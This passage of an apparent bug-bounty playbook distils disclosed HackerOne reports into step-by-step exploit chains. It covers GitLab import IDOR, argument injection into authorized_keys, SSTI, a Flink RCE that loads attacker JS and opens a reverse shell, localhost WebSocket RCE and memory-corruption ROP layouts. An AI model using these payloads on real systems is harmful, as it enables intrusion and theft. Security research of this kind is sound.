  4. Write-what-where in the JIT compiler (V4, HIGH): the "compiler receiver thread" reads a 0x58-byte `CompilerAgentRequest`; if `req.compiler_data != 0` it does `memcpy(req.compiler_data + 0x28, &req, sizeof(req))` — an attacker-supplied pointer is used verbatim. Send `compiler_data` = a JIT-memory address and put payload bytes in the request → the compiler writes shellcode into JIT memory → arbitrary execution. (No SMEP on target → kernel exploitation becomes trivial with a corrupted function pointer.)
  5. Native parser overflow (V5, HIGH): the UDF filesystem driver (github.com/williamdevries/UDF) trusts `inf_len` against the fixed `sector_size` and does `memcpy(blob, pos, inflen)` into a `sector_size`-sized buffer. A UDF image with `inf_len > sector_size` overflows → kernel panic / control.
  6. Deliver as a Blu-ray `.iso` (UDF 2.5) — the console's BD-J Java runtime auto-loads it; push the payload with `nc $PS4IP 1337 < payload.bin` (the provided PoC intentionally triggers V5's panic with a 4 MB `/PWN/0`).
DETECTION SIGNAL: a managed-runtime sandbox that (a) deserializes a local/preference file under `doPrivileged`/elevated context, (b) exposes `Class.forName`/`Class.new`/`const_get`/`newInstance` to untrusted input, (c) uses reflective proxies (`invokeMethod`, `InvocationHandler`) to invoke privileged methods, and (d) has ANY native component (JIT compiler, filesystem/parser driver) that trusts a pointer or length coming from the managed side. The presence of all four = a full escape is reachable.
CHAIN: author of a disc image (no credentials) → deserialization of `userprefs` under privileged context → arbitrary class instantiation (`Class.forName`) → reflective `invokeMethod` permission bypass (dump `/app0/`, filesystem leak) → JIT compiler write-what-where → shellcode in JIT memory → arbitrary code execution with JIT → pirated-game shipping + kernel-exploit primitives (High, $20,000; tested on firmware 9.00; the first exploit chain submitted to PlayStation).
TRANSFERABLE TEST: For any managed-runtime sandbox, hunt the four primitives in order: (1) a serialized file read under `doPrivileged`/elevated context — replace it with a crafted object; (2) a `Class.forName`/`Class.new`/`const_get` on attacker input — instantiate a `ClassLoader`/gadget; (3) a reflective proxy `invokeMethod` that skips permission checks for public non-final classes — subclass the target to reach restricted APIs; (4) any native component (JIT/parser) that reads a pointer or length from the managed side — that is your write-what-where. Chain 1→2→3→4 to go from untrusted input to code execution.

SOURCE: https://hackerone.com/reports/743953  2026-11-07
ROUTE: report body rendered via HackerOne `.json` (vulnerability_information present, full).
CLASS: IDOR / mass-assignment in an import/restore path — attacker-controlled foreign-key id arrays reassign private objects you don't own (CWE-639 + CWE-915) — GitLab "Steal private objects of other projects via project import"
CORE METHOD:
  1. GitLab exports are tarballs containing `project.json`; during import the restorer does `@project.assign_attributes(project_params)` (app/models/project_tree_restorer.rb) where `project_params` come straight from the attacker-authored `project.json`.
  2. Many relation foreign-key attributes are NOT excluded from `project_params`: `issue_ids`, `merge_request_ids`, `board_ids`, `note_ids`, etc. ("almost all non-excluded attributes behave like `issues` are affected").
  3. Craft the export so the id array names the VICTIM's object while the payload arrays stay EMPTY — this is the crux:
     "issue_ids": [ 27422144 ],
     "issues": [],
     The project is told to OWN issue id `27422144` without importing any issue body, so the restorer binds your project to the EXISTING private issue.
  4. Import the tarball as a project export into your own namespace. The imported project now contains the victim's private issue (still credited to its original author, e.g. `nyangawa-h1`) — open and read it.
  5. DB ids are incremental, so brute-force the id space to harvest arbitrarily many private issues/MRs/boards/notes. Affects gitlab.com and self-hosted.
DETECTION SIGNAL: any import/restore/duplicate/migration that reads a manifest (`project.json`, `export.json`, XML/JSON backup) and mass-assigns its attributes onto a model — especially when the manifest can carry relation id arrays (`*_ids`, `*_id`, `parent_id`, `owner_id`, `namespace_id`) alongside empty payload arrays; strong-params/`attr_protected` gaps where FK attributes aren't filtered for importers; sequential/incremental object ids.
CHAIN: any user who can import a project → hand-craft `project.json` with `"issue_ids":[<victim id>]` and `"issues":[]` → `assign_attributes` binds your project to another user's private objects → read/modify private issues, MRs, boards, notes of other projects → cross-tenant private-object theft (Critical, $20,000).
TRANSFERABLE TEST: Download any "export" the app produces (project/page/board/backup), unpack it, and inject `"<relation>_ids":[<guessed id>]` (or `"owner_id"`/`"parent_id"`) with the matching payload array emptied; re-import into your own account and check whether the imported object now references a victim's pre-existing resource. Incremental id spaces make this mass-exploitable by brute force.

---

### [Bugbountyskills.md] 17.23 Loopback control service without an Origin check → desktop (Electron) RCE

SOURCE: https://hackerone.com/reports/873614 — Sony PlayStation Now `psnow` 11.0.2 (Critical 9.6, $15,000)  read 2026-11-07
CLASS: RCE via CSRF/Origin-bypass on a localhost WebSocket service chained to a `nodeIntegration: true` Electron renderer (CWE-1385 → CWE-94)
CORE METHOD:
  1. The desktop app runs a loopback WebSocket server (`ws://localhost:1235`, also on 0.0.0.0) that accepts JSON commands and never checks `Origin`. WebSockets are exempt from SOP, so any website in any browser on the host can drive it.
  2. The app also spawns an Electron window launched with `nodeIntegration: true` and loads any URL with no allowlist.
  3. Send `{"command":"setUrl","params":{"url":"https://attacker/x.html"},"source":"QAS","target":"AGL"}` so the privileged Electron window loads attacker HTML (`require('child_process').exec(...)`).
  4. Alternatively `setUrlDefaultBrowser` → `shell.openExternal(url)` with `file:` allowed: `{"command":"setUrlDefaultBrowser","params":{"url":"file:///c:/windows/system32/calc.exe"}}`.
DETECTION SIGNAL: loopback (127.0.0.1/localhost) HTTP or WebSocket control server with no `Origin` check that exposes a navigate/load/open-url command; an Electron/CEF renderer with `nodeIntegration:true`/`contextIsolation:false`; 0.0.0.0 binding; grep `app.asar` for `commandHandler`/`setUrl`/`openExternal`.
CHAIN: any page the user opens while the app runs → no-Origin-check loopback WS → navigate command makes the node-integrated Electron window load attacker HTML → `child_process` → RCE on the user's machine.
TRANSFERABLE TEST: With the app running, enumerate loopback listeners, then from a web page `new WebSocket('ws://127.0.0.1:<port>/')` (or `fetch('http://127.0.0.1:<port>/<path>')`) and replay the captured command JSON; a navigate command + node-integrated renderer is the website→desktop RCE chain.

### [Bugbountyskills.md] 17.30 Flag injection where the wrapped tool WRITES ITS OWN attacker-controlled stdout to a path -> arbitrary file write -> authorized_keys -> RCE (GitLab #658013 ref param; #587854 Gitaly archive path)

SOURCE: https://hackerone.com/reports/658013 and https://hackerone.com/reports/587854 — GitLab (Critical)  read 2026-11-07 (bodies via `.json`)
CLASS: argument/flag injection -> arbitrary file write with attacker-controlled content -> trusted-file overwrite -> RCE
CORE METHOD:
  1. #658013: `/api/v4/projects/<id>/search?scope=wiki_blobs&search=X&ref=--output=/tmp/f` — `ref` is a git revision passed as a bare argv element; git itself writes its stdout to the chosen path. Content is attacker-authored because the log output IS the commit message: create wiki page `page` with commit message = your SSH pubkey, then run the call with `ref=--output=/var/opt/gitlab/.ssh/authorized_keys` → `ssh git@host -i key` → uid 998 (git).
  2. #587854 (same root cause, different parameter and NO dash in the request): Gitaly concatenates the selected repository DIRECTORY into the argv of `git archive`; create a directory literally named `--output=/var/opt/gitlab/.ssh/authorized_keys/` holding `id_ed25519.pub`, then click "download directory as tar" → `git … archive --format tar --prefix=/ <commit> --output=/var/opt/gitlab/.ssh/authorized_keys`. `tar` is chosen because it does not compress — the pubkey survives verbatim among tar headers, and SSH ignores the surrounding garbage as long as the key line stands alone.
DETECTION SIGNAL: a revision/branch/sha/path parameter reaching a VCS or archive CLI that accepts a `-`-prefixed value (send `--help`); a tool feature that prints content you control (commit messages, diffs) plus a flag that redirects output to a path (`--output=`); user-settable NAMES (directory/filename) reaching argv, which bypass body-only filters; a service account whose home holds `.ssh/authorized_keys`/`.gitconfig`/cron.
CHAIN: free git-repo write primitive (wiki page/commit/directory) → flag injection via `ref` or via a repository path name → tool writes your controlled bytes to an arbitrary absolute path → `authorized_keys` gains your key → SSH as the `git` service user → RCE. (General class = V-07 / §13.8-5; new part = the tool writing its OWN attacker-controlled stdout, and the no-dash delivery through a NAME.)
TRANSFERABLE TEST: Send `--help`/`--output=/tmp/marker` in every revision- or path-typed parameter; where a file appears, find the feature that echoes your data and redirect it to the service user's trusted file (`.ssh/authorized_keys` first). Then repeat with a file/directory NAMED `--output=/tmp/marker` — a dash-leading path is a flag, and uncompressed `tar`/`zip -0` preserves your payload bytes.

### [Bugbountyskills.md] 17.44 Stored SSTI whose evaluation SINK is the OUTBOUND transactional EMAIL template → the computed payload is visible only in the mail body (Uber #125980)

SOURCE: https://hackerone.com/reports/125980 — Uber, "uber.com may RCE by Flask Jinja2 Template Injection" (Code Injection, $10,000, reporter orange)  read 2026-11-07 (body via the HackerOne `.json` endpoint, 960 bytes)
CLASS: server-side template injection (Flask/Jinja2) evaluated in a mail-template renderer · CWE-1336 → CWE-94 — an extension of the V-05 SSTI playbook, which assumes the sink reflects into the PAGE; this is the OUT-OF-BAND sink
CORE METHOD:
  1. Set the account PROFILE NAME to `{{ '7'*7 }}`, then trigger the account-change notification.
  2. Read the resulting email ("Your Uber account information has been updated", from support@uber.com): the name renders as `7777777` — the display name is interpolated into the template SOURCE rather than passed as data, and the evaluation happens when the mail is built.
  3. Confirm engine / walk the graph with the reporter's verbatim payloads: `{{ [].__class__.__base__.__subclasses__() }}` (all classes), `{{''.__class__.mro()[1].__subclasses__()}}`, and loops `{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}`.
  4. Reporter's caveat: a name-field LENGTH LIMIT blocked a full `os.popen` RCE payload — the primitive is template evaluation under an input-size constraint, so look for a longer field (first/last name, company, address, bio, message body) reaching the same renderer.
DETECTION SIGNAL: any user-controlled value RE-RENDERED where you do not see it in the web response — transactional/notification emails, invoices/receipts, PDF exports, SMS/push bodies, calendar invites, webhooks, shipping labels — especially display names, first/last names, company, custom messages, "your account was updated" notifications. Set `{{7*7}}` / `{{'7'*7}}` (Jinja2 distorts type: `{{7*7}}`→`49`, `{{7*'7'}}`→`77777777`) and read the EMAIL; a computed value = SSTI. Same test applies to Twig/Smarty/Handlebars/Freemarker/ERB sinks behind mail templates.
CHAIN: attacker-controlled display field → interpolated into the transactional-email template source → server-side Jinja2 evaluation (proved out-of-band by `{{ '7'*7 }}` → `7777777` in the mail body) → arbitrary template expression → input-length limit may gate full `os.popen` RCE, so escalate via a longer sink field or a second render path → code execution / server-side data read.
TRANSFERABLE TEST: put `{{7*7}}` then `{{'7'*7}}` into every user-visible display field, trigger the notification/PDF/export that EMAILS or EXPORTS it, and read the OUT-OF-BAND copy (mailbox, generated attachment, webhook receiver). A computed value in the email = SSTI in the mail renderer — a sink the web UI never shows. Then walk the field list to find the LONGEST input reaching it before attempting a full RCE payload.

NOTE — read pass 2026-11-07 (batch 8, no §17 entry for these): https://hackerone.com/reports/72243 (Pornhub "Publicly exposed SVN repository, ht.pornhub.com", $10,000, reporter Mak) and https://hackerone.com/reports/977212 (Mail.ru "read new emails from any inbox IOS APP in notification center", IDOR Critical 9.3, $10,000) are NOT publicly readable on any route (`.json` 404, SPA shell via web_extract/browser, r.jina.ai 403, disclosed-reports mirror 404, HackerOne-HF dataset body empty or row absent, Wayback shell-only with the one archived `.json` not replayable) and no credited writeup exists → INVALID, nothing invented (recorded in the harvest ledger and the dated knowledge file). https://hackerone.com/reports/1441103 (PlayStation, setsockopt IPV6_2292PKTOPTIONS UAF, CVE-2020-7457) was read but is a DUPLICATE of the #826026 method already in this file → no entry. Memory-corruption depth stays in the lab (same sandbox doctrine as #826026 / #2177925).

### [Bugbountyskills.md] 17.47 Headless-renderer export (PDF/report/screenshot) runs an EOL bundled Chromium with `--no-sandbox` → HTML-injection / open redirect → pointing it at attacker JS → RCE (Elastic Kibana #1168765)

SOURCE: https://hackerone.com/reports/1168765 — Elastic, "RCE hazard in reporting (via Chromium)" (Privilege Escalation; Critical, $10,000; reporter alexbrasetvik)  read 2026-11-07 (full body via the HackerOne `.json` endpoint, 2,500 bytes). Filed as a HAZARD: the renderer exploit is proven; the chain INTO the renderer is the part to hunt.
CLASS: RCE via a server-side HTML renderer (old headless Chromium, `--no-sandbox`) · CWE-94 → CWE-829
CORE METHOD:
  1. Kibana Reporting generates PNGs/PDFs by driving a bundled headless Chromium; on Elastic Cloud/ECE/ECK it is launched with `--no-sandbox`, and the 7.11/7.12 builds are exploitable.
  2. Bare the sink: `docker run --rm -it docker.elastic.co/kibana/kibana:7.12.0 bash` → `cd ./x-pack/plugins/reporting/chromium/headless_shell-linux_x64/` → `./headless_shell --no-sandbox http://<attacker>/alexb-says-hi.html`. The supplied HTML is a Metasploit-derived Chromium exploit (rapid7/metasploit-framework PR #15007) that runs shell; `/tmp/alexb-says-hi` appears with `uname -a` output.
  3. The missing link (reporter): "anything that enables pointing reporting at attacker-controlled JS would be able to pop an RCE this way. HTML-injection or XSS (even with the CSP a HTML injection will enable a redirect) or an open redirect would enable pointing reporting at custom JS code."
DETECTION SIGNAL: any server-side export/print/report/screenshot/PDF feature that renders URL- or HTML-controlled content (invoice/receipt, email/SSO preview, "render this URL", link-preview/unfurl, dashboards/reporting); an OLD pinned headless Chromium/Electron/`headless_shell`/puppeteer/playwright in the product tree with a `--no-sandbox` launch flag; any input (open redirect, HTML injection, stored XSS, a user-chosen report URL) that sets the page it loads.
CHAIN: HTML-injection / XSS / open redirect in the reporting flow → point the renderer at attacker JS → old bundled Chromium exploited in-process → shell on the Kibana host (RCE).
TRANSFERABLE TEST: enumerate every "generate a PDF/image/report" endpoint and every user-chosen URL. (a) Fingerprint the renderer from the produced PDF (producer/metadata, `headless_shell` in errors, Chromium version). (b) Test whether you can influence the URL/HTML it loads (`?url=`/`?reportUrl=`, open redirect, HTML injection, XSS) — if so you hold an RCE primitive on the generation host. (c) Prefer targets pinning an EOL headless browser; the reportable finding is the injection/redirect that feeds it.

### [Bugbountyskills.md] 17.51 Untrusted INDEX from a network/binary message → unvalidated table lookup → virtual call on an attacker-shaped object → RCE (Valve CS:GO `CSVCMsg_EntityMsg` #584603)

SOURCE: https://hackerone.com/reports/584603 — Valve, "RCE on CS:GO client using unsanitized entity ID in EntityMsg message" (Out-of-bounds Read; Critical 9.6; $9,000; credited @chaynik)  read 2026-11-07 (report body `visibility: no-content`; verbatim team summary, id 56475, via the HackerOne `.json` endpoint)
CLASS: untrusted index/id from a message used to resolve an object from a fixed table, then an indirect/virtual call on it · CWE-125 → CWE-94
CORE METHOD:
  1. `CSVCMsg_EntityMsg` (protobuf `ent_index`, `class_id`, `ent_data`) is handled as `entity = entitylist->GetClientNetworkable(msg->ent_index); if (entity) entity->ReceiveMessage(...)` — `ent_index` is NOT bounds-checked, so an arbitrary int indexes outside the entity list (OOB pointer read).
  2. The resolved object's virtual function is then called → dispatch through attacker-influenced memory → control-flow diversion.
  3. Reliability needs a controllable buffer at a KNOWN address: leak/assume the module base (separate mem-disclosure bug, or guess — 32-bit ASLR is weak) and use a global the remote party can write (the MAP NAME global in `client_panorama.dll`); the entity list is a STATIC array, so the payload offset is constant → compute `ent_index`.
  4. Deliver ROP + fake object via the controllable global; start a process through an imported helper (`IProcessUtils` from `tier0.dll`) to shorten the chain. Delivery vector: malicious server, or auto-connect via the `steam://` protocol from a web page.
DETECTION SIGNAL: any service parsing a binary/RPC/WS message where a FIELD is an index/id used as `obj = table->Get(id); if (obj) obj->Virtual(...)` with no bounds/existence check; a statically allocated object table at a fixed image offset; a global buffer the remote side can write; a low-entropy address space (no PIE/ASLR).
CHAIN: attacker controls the peer → sends an out-of-range index → OOB lookup returns a pointer into an attacker-writable global → virtual call via a fake vtable → ROP → arbitrary code on the victim host (Critical 9.6, $9,000).
TRANSFERABLE TEST (our surface): for every message field that indexes a server-side array/object table (`ent_index`, `entity_id`, `object_id`, `slot`, `channel`, `player_id`, `index`), send `-1` / `0x7fffffff` / `len+N` and watch for a crash or odd behaviour at the dereference — the reportable pattern is "untrusted index → unvalidated table lookup → indirect callback"; escalate by checking for an attacker-writable global at a computable offset from the table base. (Native-client depth is out of our live web scope; on OUR targets test the same shape in RPC/WS/gRPC/deserialization handlers.)

### [Bugbountyskills.md] 17.52 Untrusted interpreter sandbox: UNBOUNDED C-LEVEL recursion (no `eval`) bypasses the script-level stack guard → process stack overflow → SIGSEGV (mruby / shopify-scripts #189633) — extends 17.49

SOURCE: https://hackerone.com/reports/189633 — shopify-scripts, "Certain inputs cause tight C-level recursion leading to process stack overflow" (Memory Corruption - Generic; High 8.6; $10,000; reporter dkasak)  read 2026-11-07 (full body via the HackerOne `.json` endpoint, 3,034 bytes)
CLASS: memory corruption / DoS in an in-process interpreter sandbox via C-level recursion the engine never counts · CWE-674 / CWE-787
CORE METHOD:
  1. Redefine a conversion/operator method so a builtin operator re-enters it and the recursion runs in C, spending little script stack: `def to_i; '' * self; end` then `to_i` (the `*` re-enters `to_i` via implicit conversion; no `eval`).
  2. Measured ~3200 bytes of PROCESS stack per recursive `mrb_vm_run` vs ~80 bytes of Ruby stack → the Ruby-level guard never trips → process stack overflow → SIGSEGV. Same root cause with `def nil.m; m a ensure m + a; end; nil.m` and `def a; Module.new do; a; end; end; a`.
  3. Fix direction: track C-level recursion depth and cap to the process stack (`(stack_size*0.9)/4096 - 1` for 8 MiB).
DETECTION SIGNAL: in-process interpreter sandbox (mruby, Lua, JS, WASM, template DSL) that limits SCRIPT recursion but not C-level recursion per interpreter frame; idioms that recurse through the host — implicit conversions (`to_i`/`to_int`), `ensure`, `Module.new do … end`, operator overloading, `method_missing`; no per-script memory isolation.
CHAIN: untrusted script → operator/conversion path recurses at C level → process stack overflow → SIGSEGV (and GC on the broken VM context → corruption) → engine DoS now, escape primitive later.
TRANSFERABLE TEST (LAB): in any sandboxed interpreter redefine a conversion/operator method so a builtin re-enters it (`def to_i; ''*self; end; to_i`) and call it; if the engine dies with a PROCESS stack overflow rather than a clean "stack level too deep", its guard only counts script frames — a DoS/corruption primitive. (Memory-corruption depth stays lab-only; on a live multi-tenant target the reportable unit is "untrusted script can crash/corrupt the shared engine".)

### [Bugbountyskills.md] 17.64 Network-message index: LOWER-bound-only check + index scaled by a fixed stride (`shl eax,4`) wraps a large positive value negative → OOB table read → virtual call on a message-staged global → RCE (Valve #807772) — sibling of 17.51

SOURCE: https://hackerone.com/reports/807772 — Valve, "OOB reads in network message handlers leads to RCE" (Out-of-bounds Read; Critical 9.9; reporter slidybat)  read 2026-11-07 (full body, 7,944 bytes, via the HackerOne `.json` endpoint)
CLASS: untrusted index + stride multiply overflow + unvalidated table lookup + virtual call on attacker-shaped memory · CWE-125 → CWE-190 → CWE-94. Same family as 17.51 (`ent_index` in `CSVCMsg_EntityMsg`); DELTA here = the sign check passes and the `<<4` stride wraps, plus the `ShowMenu`-to-global staging trick.
CORE METHOD:
  1. Handler pattern: `if ( ent_idx >= 0 && entitylist[ent_idx] != nullptr ) { handle = entitylist[ent_idx]; entity = handle->GetBaseEntity(); … }` — lower bound only (CS:GO `GlowPropTurnOff`).
  2. Asm: `mov eax, ent_idx / test eax,eax / js skip / shl eax, 4 / mov ecx, entitylist[eax]` — 16-byte entries, so a large positive index wraps negative and indexes anywhere in the image; choose one that returns a pointer to attacker-controlled memory with a fake vtable.
  3. Stage the fake object with a DIFFERENT message writing to a fixed global: `ShowMenu` converts `menu_string` to UTF-16 into `wchar_t g_szMenuString[512]`.
  4. Fake object layout: `[0]`→obj, `[1]`→vtable, `[9]`→`xchg eax, esp`, `[2]`→`pop esp`, `[3]`→ROP stack, `[10]`→ROP chain calling `ShellExecuteA("open","calc")`.
  5. Deliver `ShowMenu` (`bits_valid_slots: 0xFFFFFFFF`, `menu_string: <payload>`) then `GlowPropTurnOff` with `entidx: 0xfe43167` → code execution on any client that joins the server.
DETECTION SIGNAL: a request field used as a table index checked only for sign/lower bound and then multiplied by a fixed entry size (`<<4`, `*16`, `*sizeof(T)`); a static table at a fixed image offset; another message that copies attacker data into a fixed global (staging primitive); 32-bit weak ASLR.
CHAIN: attacker controls the peer → oversized index wraps negative via the stride shift → OOB read returns a pointer into an attacker-writable global → virtual call through a fake vtable → stack pivot → ROP → RCE on every victim client (Critical 9.9).
TRANSFERABLE TEST (LAB / native shape): for every table-index parameter (`ent_index`, `entity_id`, `object_id`, `slot`, `channel`, `player_id`, `index`, `row`) send `0x7fffffff` / `0x80000000` / `0xfe43167` as well as `-1` and watch the dereference for a crash; then hunt for a second, benign message writing attacker data into a fixed global — that is the primitive that upgrades an OOB read to controlled execution.

### [Bugbountyskills.md] 17.68 Delimiter-bounded copy into fixed STACK buffers in a client-parsed asset file (`<cmd:args>` tokenizer) → stack overflow → RCE (Valve CS:GO closed captions #463286)

SOURCE: https://hackerone.com/reports/463286 — Valve, "Specially Crafted Closed Captions File can lead to Remote Code Execution in CS:GO and other Source Games" (Memory Corruption - Generic; Critical; reporter gamer7112)  read 2026-11-07 (body empty `no-content`; read from the PUBLIC team + researcher summaries, which paste both C functions)
CLASS: unbounded copy in a two-stage text tokenizer into fixed-size stack arrays · CWE-121 / CWE-787 → CWE-94
CORE METHOD:
  1. `CHudCloseCaption::GetNoRepeatValue` declares `wchar_t cmd[256]; wchar_t args[256];` ON THE STACK and calls `SplitCommand(&curpos, cmd, args)`.
  2. `SplitCommand` parses `<cmd:args>`: loop 1 `while (*in != L'\0' && *in != L':' && *in != L'>' && !V_isspace(*in)) *out++ = *in++;` then `*out = L'\0'`; after `:` loop 2 `while (*in != L'\0' && *in != L'>') *out++ = *in++;` then `*out = L'\0'` — both bounded only by the DELIMITER, and the terminator writes even at the boundary.
  3. A caption line with a `<`-token longer than 256 wide chars (no `:`/`>`/space) overflows both arrays; the caption file ships with the server's map/gamemode and is loaded by the client → the attacker is the peer.
DETECTION SIGNAL: a parser slicing an untrusted text/asset file into fixed STACK arrays with a delimiter-bounded loop (`while (*p != DELIM) *dest++ = *p++;`) plus an unconditional `*dest = 0`; client-loaded formats (captions/subtitles/WebVTT/SRT, `.res`, playlists, channel lists, map assets, `.ini`, CSV import, log parsing).
CHAIN: attacker-controlled content host → over-long caption token → `SplitCommand` writes past `cmd[256]`/`args[256]` → return-address/SEH overwrite → RCE in the client (Critical).
TRANSFERABLE TEST: on every "parse this uploaded/downloaded text file" path submit one 300–5000-char token with the EXPECTED DELIMITER DELETED (e.g. `<AAAA…` with no `:`, `>` or whitespace) and watch for a crash at the terminator write; grep the source for `while (*p != DELIM) *dest++ = *p++;` and for `strcpy`/`wcscpy` into stack arrays.

### [Bugbountyskills.md] 17.74 Localhost "inspector" WebSocket `live_reload` downloads an attacker file with a naive `dir + fileName()` concat → path traversal → arbitrary file write → DLL drop → RCE (Mozilla VPN #2995025)

SOURCE: https://hackerone.com/reports/2995025 — Mozilla, "Mozilla VPN Clients: RCE via file write and path traversal" (Path Traversal; High CVSS 8.3; $6,000; reporter trein)  read 2026-11-07 (full body, 2,886 bytes, via the HackerOne `.json` endpoint)
CLASS: path traversal in a client's localhost dev-server command → arbitrary file write → RCE · CWE-22 → CWE-94
CORE METHOD:
  1. The client exposes `ws://localhost:8765/` (dev mode: Help → click the "Help" title 6× → "Use Staging Servers" → restart).
  2. `live_reload <remote-file-url>` writes with `temp_path = QString("%1/%2").arg(m_qml_folder, path.fileName())` then `QFile(temp_path).open(WriteOnly)` + `write(data)` (`InspectorHotreloader::fetchAndAnnounce()`) — no sanitisation, basename only, traversal in the file name.
  3. An attacker page (plain HTTP) opens the WS and sends `live_reload http://<attacker>/..\..\traversal_poc.dll` → the file lands in `…\AppData\Local\Mozilla` instead of `…\Mozilla VPN\hot_reload\`.
  4. Any file can be overwritten → plant a DLL the app loads → RCE; limited user interaction (victim only opens the page) when staging servers are in use; does NOT work on macOS.
DETECTION SIGNAL: a desktop/client app's localhost "inspector"/"devtools"/"live-reload" server (ports 8765, 9222, 35729 …) with NO Origin check; any command taking a remote URL/file the app downloads and writes; a path built by concat with `path.fileName()`; accepting `..\`, `../`, `..%5c`.
CHAIN: dev/staging flag exposes `ws://localhost:8765/` → victim opens attacker page → page sends `live_reload` with a traversal name → arbitrary file write outside the temp dir → overwrite a loaded DLL/QML/plist → RCE as the user (High).
TRANSFERABLE TEST: scan a client app for localhost inspector/dev ports and connect with a foreign Origin; enumerate the command set (`help`/unknown commands); for every URL/file-taking command send a traversal name (`..\..\poc.dll`, `../../.bashrc`, `..%2f..%2fX`) pointing at your HTTP server and check the file appears OUTSIDE the intended folder; success = arbitrary file write → target a start-up-loaded artifact for RCE.

### [Bugbountyskills.md] 17.76 Job-submission REST endpoint runs a CLASSPATH class with attacker `entry-class`/`programArg` -> JDK `jrunscript` -> RCE (Aiven Apache Flink #1418891)

SOURCE: https://hackerone.com/reports/1418891 — Aiven Ltd, "Apache Flink RCE via GET jar/plan API Endpoint" (Command Injection - Generic; Critical; $6,000; reporter jarij)  read 2026-11-07 (full body, 2,068 bytes, via the HackerOne `.json` endpoint)
CLASS: under-authorized job-submission REST endpoint -> arbitrary classpath-class invocation -> command execution · CWE-94 + CWE-306
CORE METHOD:
  1. `GET /jars/{jar_id}/plan` on the Flink REST API accepts `entry-class`, `programArg`, `parallelism` and RUNS the named class from the server classpath with those arguments.
  2. Exploit request: `GET /jars/145df7ff-…_a.jar/plan?entry-class=com.sun.tools.script.shell.Main&programArg=-e,load("https://attacker/x.js")&parallelism=1` (the `Authorization: Basic` is the account's OWN session — the endpoint itself is not restricted).
  3. `com.sun.tools.script.shell.Main` = the JDK's `jrunscript`; `-e load("http://attacker/x.js")` evaluates the attacker JS inside the Flink JVM -> reverse shell (`nc -lvp 8888`) -> RCE; Flink crashes after and is auto-restarted, so re-run a job each attempt.
DETECTION SIGNAL: Flink/Spark/Storm/Samza/Beam job API — Flink Web UI `:8081`, `/jars/`, `/jars/upload`, `/jars/{id}/run`, `/jars/{id}/plan`, `/jobs`, `/sql-gateway` — reachable unauthenticated or with default creds; params `entry-class`/`entryClass`/`programArg`/`args`; side-effecting classpath classes (`com.sun.tools.script.shell.Main`/`jrunscript`, Groovy, MVEL, XStream, Nashorn).
CHAIN: reachable job API -> `plan`/`run` loads any classpath class with attacker args -> jrunscript evaluates attacker JS in the JVM -> reverse shell -> RCE -> internal pivot.
TRANSFERABLE TEST: `GET /jars/` to list jars, then `GET /jars/<id>/plan?entry-class=com.sun.tools.script.shell.Main&programArg=-e,load("http://YOUR-COLLAB/x.js")&parallelism=1` (and `/run`) with a listener up; a callback proves classpath-class execution. If filtered, try `/run`, `/jars/upload` with a built jar, or the SQL gateway.

### [Bugbountyskills.md] 17.88 A client tool materialises a local file whose NAME comes from page-controlled attributes — `Path.resolve` escapes the tool's temp dir → arbitrary file write to an autostart path → RCE (PortSwigger Burp #3712279)

SOURCE: https://hackerone.com/reports/3712279 — PortSwigger Web Security, "Burp Suite Professional: browser-powered crawl can write attacker-controlled files through file input handling" (Path Traversal; reporter kawakatz; severity High 7~8.9; $5,000)  read 2026-11-07 (full 35,050-char body via `r.jina.ai`; not in the local dataset mirrors)
CLASS: path traversal in the tool's own local-file creation — an untrusted WEB-PAGE attribute used as local file metadata · CWE-22 → CWE-434 → CWE-94
CORE METHOD:
  1. Serve one page whose file input carries the traversal in `accept`: `<input type="file" name="upload" value="calc.exe" accept="./../../../../Roaming/Microsoft/Windows/Start Menu/Programs/Startup/burp_calc.bat">` — the form ACTION need not exist (the write happens while the crawler PREPARES the file input, before submission).
  2. Point the browser-driven crawler at it. Decompiled logic: `if(input.type()==InputType.FILE){ prepareFileInput(input); }` → `prepareFileInput` writes the page-controlled `inputValue()` into a temp file → `buildTemporaryUploadFile` returns `Files.createTempDirectory("burp").resolve(filename)`, and `deriveFileNameFromFileInput()` accepts ANY comma-separated `accept` token that STARTS WITH `.` as an extension.
  3. `Path.resolve(<attacker string>)` therefore escapes the temp dir and the attacker's bytes (`calc.exe`) are written to the Windows Startup folder → execution at next logon.
DETECTION SIGNAL: any tool/crawler/scanner/dev-server that materialises a local file from PAGE-CONTROLLED data (file-input `accept`/`value`, `a[download]`, `Content-Disposition: filename=`, multipart `filename=`, `filename*=`) feeding `resolve()/join()/Path()` with no separator strip, no `..` normalisation and no "resolved path stays under my temp dir" assertion; autostart sinks (Windows Startup, `~/.config/autostart`, `~/.bashrc`, cron, `~/Library/LaunchAgents`) as the destination.
CHAIN: attacker page → crawler prepares the file input from the traversing `accept` value → tool writes attacker bytes to an arbitrary user-writable path → Startup `.bat`/autostart → code execution on the workstation running the security tool (RCE of the tool's host).
TRANSFERABLE TEST: for any tool that fetches/crawls a page, host `<input type=file value=PWNED accept="./../../../../<target dir>/x.txt">`, drive the tool at it, and prove a file appeared OUTSIDE its intended temp dir with your content; then retarget the path at an autostart location. Variants: `Content-Disposition: attachment; filename=../../…`, `a[download="../../…"]`, RFC-2231 `filename*=`.

### [Bugbountyskills.md] 17.90 Peer-supplied BIT length copied into a fixed BYTE-sized stack buffer off a voice/network channel — stack overflow → RCE (Valve Portal 2 #733267)

SOURCE: https://hackerone.com/reports/733267 — Valve, "[Portal 2] Remote Code Execution via voice packets" (Classic Buffer Overflow; Critical 9~10; reporter gamer7112; disclosed 2021-05-10; 169 votes; $5,000)  read 2026-11-07 (body via `r.jina.ai`; dataset row is `visibility: no-content`)
CLASS: stack buffer overflow via an unbounded peer-declared length (bit/byte unit mismatch) in a network packet handler · CWE-121 / CWE-787 → CWE-94
CORE METHOD:
  1. Sink as quoted in the report: `char voiceDataBuffer[4096]; msg->m_DataIn.ReadBits(voiceDataBuffer, msg->m_nLength); SV_BroadcastVoiceData(this, Bits2Bytes(msg->m_nLength), voiceDataBuffer, msg->m_xuid);` — a fixed 4096-BYTE stack buffer, a peer-declared length in BITS, no clamp against `sizeof`, and the bits→bytes conversion applied only AFTER the copy.
  2. Delivery: be a co-player (invite/join the victim's game, wait for both clients to load) — no privileged position needed.
  3. Inject a DLL into the ATTACKER'S OWN client that crafts `CLC_VoiceData` with an oversized `m_nLength` → the RECEIVER's stack is overwritten → attacker code executes on the victim (`calc.exe` on the victim's machine).
